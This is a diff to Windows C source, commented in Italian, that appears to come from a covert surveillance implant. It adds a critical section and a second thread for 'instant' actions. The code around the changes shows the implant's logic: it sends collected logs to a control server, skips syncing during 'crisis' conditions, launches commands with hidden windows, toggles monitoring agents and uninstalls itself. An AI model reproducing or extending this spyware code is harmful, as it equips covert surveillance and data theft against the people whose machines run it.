@@ -23,6 +23,12 @@ void UpdateEventConf(void);
 void EventMonitorStartAll(void);    
 void SM_AddExecutedProcess(DWORD);
 
+// Impedisce la concorrenza fra piu' azioni (tranne la sync, che protegge solo un pezzettino)
+CRITICAL_SECTION action_critic_sec;
+// Per la gestione del secondo thread delle azioni (quelle istantanee)
+BOOL bInstantActionThreadSemaphore = FALSE; 
+HANDLE hInstantActionThread = NULL;
+
 // Dichiarazione delle possibili azioni
 BOOL WINAPI DA_Uninstall(BYTE *dummy_param, DWORD dummy_len);
 BOOL WINAPI DA_Syncronize(BYTE *action_param, DWORD action_len);
@@ -31,13 +37,18 @@ BOOL WINAPI DA_StopAgent(BYTE *agent_tag, DWORD param_len);
 BOOL WINAPI DA_Execute(BYTE *command, DWORD command_len);
 BOOL WINAPI DA_LogInfo(WCHAR *info, DWORD info_len);
 
+// Dichiarazione del thread che puo' essere ristartato dalla sync
+DWORD WINAPI FastActionsThread(DWORD);
 
 // Scrive un log di tipo info
 BOOL WINAPI DA_LogInfo(BYTE *info, DWORD info_len)
 {
 	WCHAR info_string[1024];
 	_snwprintf_s(info_string, 1024, _TRUNCATE, L"[User]: %s", (WCHAR *)info);
+
+	EnterCriticalSection(&action_critic_sec);
 	SendStatusLog(info_string);
+	LeaveCriticalSection(&action_critic_sec);
 	return FALSE;
 }
 
@@ -48,17 +59,20 @@ BOOL WINAPI DA_Syncronize(BYTE *action_param, DWORD action_len)
 		DWORD min_sleep;
 		DWORD max_sleep;
 		DWORD band_limit;
+		//BOOL  exit_after_completion;
 		char conf_string[1];
 	} sync_conf_struct;
 	sync_conf_struct *sync_conf;
 	DWORD ret_val; 
 	BOOL conn_error = FALSE;
+	BOOL exit_after_completion;
 
 	char *asp_server, *unique_id;
 	BOOL uninstall;
 	long long actual_time;
 	DWORD availables[20];
 	BOOL new_conf = FALSE;
+	DWORD dummy;
 
 	// Verifica che ci sia il parametro e che non siamo in momento di crisi
 	if (!action_param || IsCrisisNetwork())
@@ -70,6 +84,11 @@ BOOL WINAPI DA_Syncronize(BYTE *action_param, DWORD action_len)
 	sync_conf = (sync_conf_struct *)action_param;
 	asp_server = sync_conf->conf_string;
 	unique_id = strchr(asp_server, 0) + 1;
+
+	// XXXXXXXXXXXXXXXXXXXX - Deve essere inserito come nuovo parametro della sync
+	//exit_after_completion = sync_conf->exit_after_completion;
+	exit_after_completion = FALSE;
+
 
 	// Quando riceve l'uninstall la funzione ritorna comunque FALSE
 	if (!LOG_StartLogConnection(asp_server, unique_id, &uninstall, &actual_time, availables, sizeof(availables))) {
@@ -107,12 +126,14 @@ BOOL WINAPI DA_Syncronize(BYTE *action_param, DWORD action_len)
 	// Gli agent sono costretti a chiudere tutti i file
 	// aperti prima dello scambio della coda dei log.
 	// E ad agenti stoppati sposta tutti i log nella coda da inviare...
+	EnterCriticalSection(&action_critic_sec);
 	AM_SuspendRestart(AM_SUSPEND);
 	Log_SwitchQueue();
 	if (new_conf)
 		AM_SuspendRestart(AM_RESET); // Riattiva gli agenti da file di configurazione (se c'e' nuovo)
 	else 
 		AM_SuspendRestart(AM_RESTART); // Rimette gli agent nella condizione che avevano alla suspend
+	LeaveCriticalSection(&action_critic_sec);
 
 	// Invia la coda dei log da spedire (no concorrenza con agenti)
 	// Essendo l'ultima parte del protocollo, questa funzione si occupera' anche di mandare i PROTO_BYE
@@ -122,12 +143,17 @@ BOOL WINAPI DA_Syncronize(BYTE *action_param, DWORD action_len)
 	// Modifica configurazione eventi/azioni
 	// se ha ricevuto nuovo file di conf
 	if (new_conf) {
+		// Devo killare l'altro thread delle azioni perche' sto per distruggere la tabella di eventi/azioni
+		// Lo posso fare perche' sono fuori dalla critical section (quindi l'altro thread non e' bloccato)
+		QUERY_CANCELLATION(hInstantActionThread, bInstantActionThreadSemaphore);
 		EventMonitorStopAll();    
 		UpdateEventConf();
-		EventMonitorStartAll();        
-		return TRUE;
+		EventMonitorStartAll();
+		// Ricreo il thread di gestione delle azioni fast (ora la tabella esiste di nuovo)
+		hInstantActionThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)FastActionsThread, NULL, 0, &dummy);
+		return TRUE; // C'e' una nuova conf, quindi anche questo thread deve smettere di eseguire subactions
 	}
-	return FALSE;
+	return exit_after_completion;
 }
 
 
@@ -138,7 +164,9 @@ BOOL WINAPI DA_StartAgent(BYTE *agent_tag, DWORD param_len)
 	if (!agent_tag || param_len!=4)
 		return FALSE;
 
+	EnterCriticalSection(&action_critic_sec);
 	AM_MonitorStartStop(*(DWORD *)agent_tag, TRUE);
+	LeaveCriticalSection(&action_critic_sec);
 	return FALSE;
 }
 
@@ -150,7 +178,9 @@ BOOL WINAPI DA_StopAgent(BYTE *agent_tag, DWORD param_len)
 	if (!agent_tag || param_len!=4)
 		return FALSE;
 
+	EnterCriticalSection(&action_critic_sec);
 	AM_MonitorStartStop(*(DWORD *)agent_tag, FALSE);
+	LeaveCriticalSection(&action_critic_sec);
 	return FALSE;
 }
 
@@ -189,6 +219,7 @@ BOOL WINAPI DA_Execute(BYTE *command, DWORD command_len)
 	if (!command || IsCrisisSystem())
 		return FALSE;
 
+
 	// Il processo viene lanciato con la main window
 	// nascosta
 	ZeroMemory( &si, sizeof(si) );
@@ -196,11 +227,12 @@ BOOL WINAPI DA_Execute(BYTE *command, DWORD command_len)
 	si.wShowWindow = SW_HIDE;
 	si.dwFlags = STARTF_USESHOWWINDOW;
 	HM_CreateProcess((char *)command, 0, &si, &pi, 0);
+
 	// Se HM_CreateProcess fallisce, pi.dwProcessId e' settato a 0.
 	// Lo aggiunge alla lista dei processi eseguiti
 	if (pi.dwProcessId) 
 		SM_AddExecutedProcess(pi.dwProcessId);
-
+	
 	return FALSE;
 }
 
@@ -209,6 +241,11 @@ BOOL WINAPI DA_Execute(BYTE *command, DWORD command_len)
 BOOL WINAPI DA_Uninstall(BYTE *dummy_param, DWORD dummy_len)
 {
 	char conf_path[DLLNAMELEN];
+
+	// Aspetta che il thread di azioni istantanee sia morto.
+	// A quel punto ha pieni poteri su tutto visto che viene gestita solo 
+	// dal thread principale (lo stesso che gestisce le sync)
+	QUERY_CANCELLATION(hInstantActionThread, bInstantActionThreadSemaphore);
 
 	// Killa (se c'e') la dll di supporto a 64bit
 	Kill64Core();
